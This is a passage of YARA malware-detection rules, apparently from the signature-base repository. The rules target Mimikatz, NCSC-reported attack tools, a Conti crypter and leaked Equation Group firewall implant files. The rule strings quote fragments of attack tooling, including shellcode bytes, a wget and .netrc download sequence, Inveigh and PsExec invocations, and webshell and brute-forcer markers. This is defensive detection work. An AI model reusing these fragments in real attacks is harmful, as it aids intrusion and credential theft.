              03 3c 17 81 c7 44 24 3c 94 c0 3d f6 }

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_Mimikatz_Memssp_Hookfn
{
	meta:
		description = "Detects Default Mimikatz memssp module in-memory"
		author = "SBousseaden"
		id = "89940110-8a5e-5a28-bf64-3b568f8ef1f8"
		date = "2020-08-26"
		modified = "2023-12-05"
		reference = "https://github.com/sbousseaden/YaraHunts/blob/master/mimikatz_memssp_hookfn.yara"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mimikatz.yar#L192-L216"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "27cf87f801111f17af76ab4c4f8329b73165f24f755d33edbb22d845bba6d3ff"
		score = 70
		quality = 85
		tags = ""

	strings:
		$xc1 = { 48 81 EC A8 00 00 00 C7 84 24 88 00 00 00 ?? ?? 
               ?? ?? C7 84 24 8C 00 00 00 ?? ?? ?? ?? C7 84 24 
               90 00 00 00 ?? ?? ?? 00 C7 84 24 80 00 00 00 61 
               00 00 00 C7 44 24 40 5B 00 25 00 C7 44 24 44 30 
               00 38 00 C7 44 24 48 78 00 3A 00 C7 44 24 4C 25 
               00 30 00 C7 44 24 50 38 00 78 00 C7 44 24 54 5D 
               00 20 00 C7 44 24 58 25 00 77 00 C7 44 24 5C 5A 
               00 5C 00 C7 44 24 60 25 00 77 00 C7 44 24 64 5A 
               00 09 00 C7 44 24 68 25 00 77 00 C7 44 24 6C 5A 
               00 0A 00 C7 44 24 70 00 00 00 00 48 8D 94 24 80 
               00 00 00 48 8D 8C 24 88 00 00 00 48 B8 A0 7D ?? 
               ?? ?? ?? 00 00 FF D0 }

	condition:
		$xc1
}

rule SIGNATURE_BASE_User_Function_String
{
	meta:
		description = "Detects user function string from NCSC report"
		author = "NCSC"
		id = "563ac6af-6b37-53c6-ae13-d97e31edb088"
		date = "2018-04-06"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ncsc_report_04_2018.yar#L54-L71"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b5278301da06450fe4442a25dda2d83d21485be63598642573f59c59e980ad46"
		logic_hash = "04821d1d5c12b5a9aca3c5b4be9f7a7d35320ad1503ccbdadebc7710c613a976"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a2 = "e.RandomHashString"
		$a3 = "e.Decode"
		$a4 = "e.Decrypt"
		$a5 = "e.HashStr"
		$a6 = "e.FromB64"

	condition:
		4 of ( $a* )
}

rule SIGNATURE_BASE_Batch_Script_To_Run_Psexec
{
	meta:
		description = "Detects malicious batch file from NCSC report"
		author = "NCSC"
		id = "1fbeeec8-a5bd-569e-b435-c7d82d32e47b"
		date = "2018-04-06"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ncsc_report_04_2018.yar#L91-L107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b7d7c4bc8f9fd0e461425747122a431f93062358ed36ce281147998575ee1a18"
		logic_hash = "9bdaa14aa535c178914f83c12b23484162f085c6fc6041d379268546ee99f462"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Tokens=1 delims=" ascii
		$ = "SET ws=%1" ascii
		$ = "Checking %ws%" ascii
		$ = "%TEMP%\\%ws%ns.txt" ascii
		$ = "ps.exe -accepteula" ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_Batch_Powershell_Invoke_Inveigh
{
	meta:
		description = "Detects malicious batch file from NCSC report"
		author = "NCSC"
		id = "c5dab029-6515-5d58-9ccd-bf438ba692d5"
		date = "2018-04-06"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ncsc_report_04_2018.yar#L109-L124"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0a6b1b29496d4514f6485e78680ec4cd0296ef4d21862d8bf363900a4f8e3fd2"
		logic_hash = "5048a180df301707622e9ad0b949da9e39d2f55f16fc43e7344a8181596a836c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Inveigh.ps1" ascii
		$ = "Invoke-Inveigh" ascii
		$ = "-LLMNR N -HTTP N -FileOutput Y" ascii
		$ = "powershell.exe" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_RDP_Brute_Strings
{
	meta:
		description = "Detects RDP brute forcer from NCSC report"
		author = "NCSC"
		id = "d6f0cdbc-a910-5826-b25a-61c2924f8e2a"
		date = "2018-04-06"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ncsc_report_04_2018.yar#L151-L174"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8234bf8a1b53efd2a452780a69666d1aedcec9eb1bb714769283ccc2c2bdcc65"
		logic_hash = "80c51d82a57271409d298b5175505c4234a6c3ec8a8763c93b669d1f0a8d59ba"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "RDP Brute" ascii wide
		$ = "RdpChecker" ascii
		$ = "RdpBrute" ascii
		$ = "Brute_Count_Password" ascii
		$ = "BruteIPList" ascii
		$ = "Chilkat_Socket_Key" ascii
		$ = "Brute_Sync_Stat" ascii
		$ = "(Error! Hyperlink reference not valid.)" wide
		$ = "BadRDP" wide
		$ = "GoodRDP" wide
		$ = "@echo off{0}:loop{0}del {1}{0}if exist {1} goto loop{0}del {2}{0}del \"{2}\"" wide
		$ = "Coded by z668" wide

	condition:
		4 of them
}

rule SIGNATURE_BASE_WEBSHELL_Z_Webshell_1
{
	meta:
		description = "Detects Z Webshell from NCSC report"
		author = "NCSC"
		id = "f4b50760-bd3a-5e1f-bf32-50f16a42c381"
		date = "2018-04-06"
		modified = "2023-12-05"
		old_rule_name = "Z_WebShell"
		reference = "https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ncsc_report_04_2018.yar#L176-L192"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ace12552f3a980f1eed4cadb02afe1bfb851cafc8e58fb130e1329719a07dbf0"
		logic_hash = "1dfc546a7493c1443527ebe74ed8cd2b06ee032b9a3f736b830e16288e616d43"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Z_PostBackJS" ascii wide
		$ = "z_file_download" ascii wide
		$ = "z_WebShell" ascii wide
		$ = "1367948c7859d6533226042549228228" ascii wide

	condition:
		3 of them
}

rule SIGNATURE_BASE_Bluenoroffpos_DLL
{
	meta:
		description = "Bluenoroff POS malware - hkp.dll"
		author = "Florian Roth"
		id = "d2b34b50-c7eb-5852-ba5d-734dd5038c2e"
		date = "2018-06-07"
		modified = "2023-12-05"
		reference = "http://blog.trex.re.kr/3?category=737685"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_bluenoroff_pos.yar#L2-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "39f23045b3e5ef60c199091b7f01ac2a3a31bcb95219aebb9a4cfd0764886f19"
		score = 75
		quality = 73
		tags = ""

	strings:
		$dll = "ksnetadsl.dll" ascii wide fullword nocase
		$exe = "xplatform.exe" ascii wide fullword nocase
		$agent = "Nimo Software HTTP Retriever 1.0" ascii wide nocase
		$log_file = "c:\\windows\\temp\\log.tmp" ascii wide nocase
		$base_addr = "%d-BaseAddr:0x%x" ascii wide nocase
		$func_addr = "%d-FuncAddr:0x%x" ascii wide nocase
		$HF_S = "HF-S(%d)" ascii wide
		$HF_T = "HF-T(%d)" ascii wide

	condition:
		5 of them
}

rule SIGNATURE_BASE_MAL_RANSOM_Conticrypter
{
	meta:
		description = "Signature for a crypter associated with Conti"
		author = "James Quinn, Binary Defense"
		id = "f2a00655-41a2-5614-9c29-3629c93c0e95"
		date = "2021-03-17"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_ransom_conti.yar#L2-L16"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "256fbd028a91da45049e2e861e16e97201f09cb92ab049eda373c80e6a796726"
		score = 75
		quality = 85
		tags = ""
		tlp = "White"

	strings:
		$handoff1 = {4C 8D 05 ?? ?? ?? ?? 48 C7 44 24 28 00 00 00 00 C7 44 24 20 00 00 00 00 e8}
		$handoff2 = {C7 ?? 24 ?? 00 00 00 00 89 44 24 ?? C7 ?? 24 ?? ?? ?? ?? ?? C7 ?? 24 ?? 00 00 00 00 }
		$garbageLoad1 = {53 48 83 EC 20 89 CB 48 8D 0D ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 01 D8 48 83 C4 20 5B C3}
		$garbageLoad2 = {55 89 E5 83 EC 18 C7 ?? 24 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 03 45 08 52 C9 C3}

	condition:
		1 of ( $handoff* ) and 1 of ( $garbageLoad* )
}

rule SIGNATURE_BASE_EQGRP_Create_Dns_Injection
{
	meta:
		description = "EQGRP Toolset Firewall - file create_dns_injection.py"
		author = "Florian Roth (Nextron Systems)"
		id = "ef358ca6-ebd8-5d08-944b-f1fcd112f1f3"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L252-L266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a07cb33c459208410b326fc260e96e617385ee4eac905a92d9542cb5ec73713e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "488f3cc21db0688d09e13eb85a197a1d37902612c3e302132c84e07bc42b1c32"

	strings:
		$s1 = "Name:   A hostname: 'host.network.com', a decimal numeric offset within" fullword ascii
		$s2 = " www.badguy.net,CNAME,1800,host.badguy.net \\\\" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Screamingplow
{
	meta:
		description = "EQGRP Toolset Firewall - file screamingplow.sh"
		author = "Florian Roth (Nextron Systems)"
		id = "cb535ef0-e3ea-54cc-9082-3d63cc96d93a"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L268-L282"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "429ff81b6079785cc45d81b5ebf8bccd49f30484ca692017b0b66484463606d4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "c7f4104c4607a03a1d27c832e1ebfc6ab252a27a1709015b5f1617b534f0090a"

	strings:
		$s1 = "What is the name of your PBD:" fullword ascii
		$s2 = "You are now ready for a ScreamPlow" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Mixtext
{
	meta:
		description = "EQGRP Toolset Firewall - file MixText.py"
		author = "Florian Roth (Nextron Systems)"
		id = "99b06100-8a05-5c22-8b7d-ed451d5f4e81"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L284-L297"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cae2437124ad6e69b04a1338b651e33c7358b7fedd0613f3fa1025cf980e14ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "e4d24e30e6cc3a0aa0032dbbd2b68c60bac216bef524eaf56296430aa05b3795"

	strings:
		$s1 = "BinStore enabled implants." fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Tunnel_State_Reader
{
	meta:
		description = "EQGRP Toolset Firewall - file tunnel_state_reader"
		author = "Florian Roth (Nextron Systems)"
		id = "e48c9482-eae5-5c34-b7b2-502d0252f4a0"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L299-L313"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d0653650aad10e7ff69b7ef1e61fac64310c63cc68c6d924655f082925e4fd04"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "49d48ca1ec741f462fde80da68b64dfa5090855647520d29e345ef563113616c"

	strings:
		$s1 = "Active connections will be maintained for this tunnel. Timeout:" fullword ascii
		$s5 = "%s: compatible with BLATSTING version 1.2" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Payload
{
	meta:
		description = "EQGRP Toolset Firewall - file payload.py"
		author = "Florian Roth (Nextron Systems)"
		id = "949cb68b-e384-578c-a906-a4d9234dc668"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L315-L329"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "22e2a4809f6646437ab0824238fec791f3760ac305f9c818089797b011425b3d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "21bed6d699b1fbde74cbcec93575c9694d5bea832cd191f59eb3e4140e5c5e07"

	strings:
		$s1 = "can't find target version module!" fullword ascii
		$s2 = "class Payload:" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_EQGRP_Eligiblecandidate
{
	meta:
		description = "EQGRP Toolset Firewall - file eligiblecandidate.py"
		author = "Florian Roth (Nextron Systems)"
		id = "e084b051-4aa1-54b2-9f56-69db386b46d6"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L331-L348"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e7e1b206f9c51ffe0ab016a93d551a9ede8f87adfc38fe70278be8c2f0fe0696"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "c4567c00734dedf1c875ecbbd56c1561a1610bedb4621d9c8899acec57353d86"

	strings:
		$o1 = "Connection timed out. Only a problem if the callback was not received." fullword ascii
		$o2 = "Could not reliably detect cookie. Using 'session_id'..." fullword ascii
		$c1 = "def build_exploit_payload(self,cmd=\"/tmp/httpd\"):" fullword ascii
		$c2 = "self.build_exploit_payload(cmd)" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_BUSURPER_2211_724
{
	meta:
		description = "EQGRP Toolset Firewall - file BUSURPER-2211-724.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "d109210e-14df-5b90-a496-fa8a2454126b"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L350-L367"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "834180ef512882cc3b22e79a6bda349678eb5042a3356a50c47eeb36ae453427"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "d809d6ff23a9eee53d2132d2c13a9ac5d0cb3037c60e229373fc59a4f14bc744"

	strings:
		$s1 = ".got_loader" fullword ascii
		$s2 = "_start_text" ascii
		$s3 = "IMPLANT" fullword ascii
		$s4 = "KEEPGOING" fullword ascii
		$s5 = "upgrade_implant" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_EQGRP_Networkprofiler_Orderscans
{
	meta:
		description = "EQGRP Toolset Firewall - file networkProfiler_orderScans.sh"
		author = "Florian Roth (Nextron Systems)"
		id = "2d48df0c-f950-5bb6-8d3e-77c2f970eb57"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L369-L383"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0cdf4f3d8f668ce5d5aab652c83cb4d2a9acc3471ff720448d021707b34402ef"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "ea986ddee09352f342ac160e805312e3a901e58d2beddf79cd421443ba8c9898"

	strings:
		$x1 = "Unable to save off predefinedScans directory" fullword ascii
		$x2 = "Re-orders the networkProfiler scans so they show up in order in the LP" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Epicbanana_2_1_0_1
{
	meta:
		description = "EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py"
		author = "Florian Roth (Nextron Systems)"
		id = "cc3346bd-0347-5cf3-b946-5c017d68d93e"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L385-L399"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "be0b180e0dfdda35725ac6d9c35752a0b56bdbdaf985b6932c7d2ff342d4cde3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "4b13cc183c3aaa8af43ef3721e254b54296c8089a0cd545ee3b867419bb66f61"

	strings:
		$s1 = "failed to create version-specific payload" fullword ascii
		$s2 = "(are you sure you did \"make [version]\" in versions?)" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Sniffer_Xml2Pcap
{
	meta:
		description = "EQGRP Toolset Firewall - file sniffer_xml2pcap"
		author = "Florian Roth (Nextron Systems)"
		id = "c284ac58-923c-5c34-b420-e87797915233"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L401-L415"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3c3aa9f42edbca32725f8c02023e3b9644162a001ded099513d12f94d70dd4c8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "f5e5d75cfcd86e5c94b0e6f21bbac886c7e540698b1556d88a83cc58165b8e42"

	strings:
		$x1 = "-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)" fullword ascii
		$x2 = "convert an XML file generated by the BLATSTING sniffer module into a pcap capture file." fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Bananaaid
{
	meta:
		description = "EQGRP Toolset Firewall - file BananaAid"
		author = "Florian Roth (Nextron Systems)"
		id = "bdd3ce51-1809-5b2f-9c7e-6c0b056d022b"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L417-L433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2ae52529547866dcfe66fffb3f5b37eba89844b7675129c66636ebef01b0f49a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "7a4fb825e63dc612de81bc83313acf5eccaa7285afc05941ac1fef199279519f"

	strings:
		$x1 = "(might have to delete key in ~/.ssh/known_hosts on linux box)" fullword ascii
		$x2 = "scp BGLEE-" ascii
		$x3 = "should be 4bfe94b1 for clean bootloader version 3.0; " fullword ascii
		$x4 = "scp <configured implant> <username>@<IPaddr>:onfig" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Config_Jp1_UA
{
	meta:
		description = "EQGRP Toolset Firewall - file config_jp1_UA.pl"
		author = "Florian Roth (Nextron Systems)"
		id = "947e6f90-4eb4-5241-9819-677cee0c15d8"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L472-L488"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8dd504bd00f72b1500375fbe451f5abb055cb2ff440f6ae4314b1e3d64097b83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2f50b6e9891e4d7fd24cc467e7f5cfe348f56f6248929fec4bbee42a5001ae56"

	strings:
		$x1 = "This program will configure a JETPLOW Userarea file." fullword ascii
		$x2 = "Error running config_implant." fullword ascii
		$x3 = "NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION " fullword ascii
		$x4 = "First IP address for beacon destination [127.0.0.1]" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Userscript
{
	meta:
		description = "EQGRP Toolset Firewall - file userscript.FW"
		author = "Florian Roth (Nextron Systems)"
		id = "c6c1b70e-437f-50e7-9055-b943a1a62e6c"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L490-L503"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "718ee434c8ae61e2709df6dd431dbb0a2230085f0132ae82c7ceda4de75248cf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "5098ff110d1af56115e2c32f332ff6e3973fb7ceccbd317637c9a72a3baa43d7"

	strings:
		$x1 = "Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! " fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Workit
{
	meta:
		description = "EQGRP Toolset Firewall - file workit.py"
		author = "Florian Roth (Nextron Systems)"
		id = "b582f990-5bd5-592d-a7c0-475fdfffc38c"
		date = "2016-08-16"
		modified = "2023-01-27"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L542-L566"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1fa61e8c2012e664fee97ff608bcd8845bbd9701fa02d39d49379f7f83a5636d"
		score = 75
		quality = 35
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "fb533b4d255b4e6072a4fa2e1794e38a165f9aa66033340c2f4f8fd1da155fac"

	strings:
		$s1 = "macdef init > /tmp/.netrc;" fullword ascii
		$s2 = "/usr/bin/wget http://" ascii
		$s3 = "HOME=/tmp ftp" fullword ascii
		$s4 = " >> /tmp/.netrc;" fullword ascii
		$s5 = "/usr/rapidstream/bin/tftp" fullword ascii
		$s6 = "created shell_command:" fullword ascii
		$s7 = "rm -f /tmp/.netrc;" fullword ascii
		$s8 = "echo quit >> /tmp/.netrc;" fullword ascii
		$s9 = "echo binary >> /tmp/.netrc;" fullword ascii
		$s10 = "chmod 600 /tmp/.netrc;" fullword ascii
		$s11 = "created cli_command:" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_EQGRP_Shellcode
{
	meta:
		description = "EQGRP Toolset Firewall - file shellcode.py"
		author = "Florian Roth (Nextron Systems)"
		id = "d923c1de-c6eb-511f-ae1f-bf3ac6e0eae8"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L586-L605"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "69a04db721a0d17720f9db9386d47309f01d1fc31bd5e833cedb9e1c2eb573ae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "ac9decb971dd44127a6ca0d35ac153951f0735bb4df422733046098eca8f8b7f"

	strings:
		$s1 = "execute_post = '\\xe8\\x00\\x00\\x00\\x00\\x5d\\xbe\\xef\\xbe\\xad\\xde\\x89\\xf7\\x89\\xec\\x29\\xf4\\xb8\\x03\\x00\\x00\\x00" ascii
		$s2 = "tiny_exec = '\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00" ascii
		$s3 = "auth_id = '\\x31\\xc0\\xb0\\x03\\x31\\xdb\\x89\\xe1\\x31\\xd2\\xb6\\xf0\\xb2\\x0d\\xcd\\x80\\x3d\\xff\\xff\\xff\\xff\\x75\\x07" ascii
		$c1 = { e8 00 00 00 00 5d be ef be ad de 89 f7 89 ec 29 f4 b8 03 00 00 00 }
		$c3 = { 31 c0 b0 03 31 db 89 e1 31 d2 b6 f0 b2 0d cd 80 3d ff ff ff ff 75 07 }

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Jetplow_SH
{
	meta:
		description = "EQGRP Toolset Firewall - file jetplow.sh"
		author = "Florian Roth (Nextron Systems)"
		id = "e7780540-29c9-5827-8ac0-a685d9ba8a5f"
		date = "2016-08-16"
		modified = "2023-12-05"
		reference = "Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_eqgrp.yar#L650-L666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8ae203527c4e41ae169c63521bb08d5199c43dfd1028574a1791ab1f8f198105"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "ee266f84a1a4ccf2e789a73b0a11242223ed6eba6868875b5922aea931a2199c"

	strings:
		$s1 = "cd /current/bin/FW/BANANAGLEE/$bgver/Install/LP/jetplow" fullword ascii
		$s2 = "***** Please place your UA in /current/bin/FW/OPS *****" fullword ascii
		$s3 = "ln -s ../jp/orig_code.bin orig_code_pixGen.bin" fullword ascii
		$s4 = "*****             Welcome to JetPlow              *****" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_EQGRP_Extrabacon
{
	meta:
		description = "EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py"
		author = "Florian Roth (Nextron Systems)"
		id = "79b998ef-e548-5038-b8ad-da1abf362e7f"
		date = "2016-08-16"
		modified = "2023-12-05"
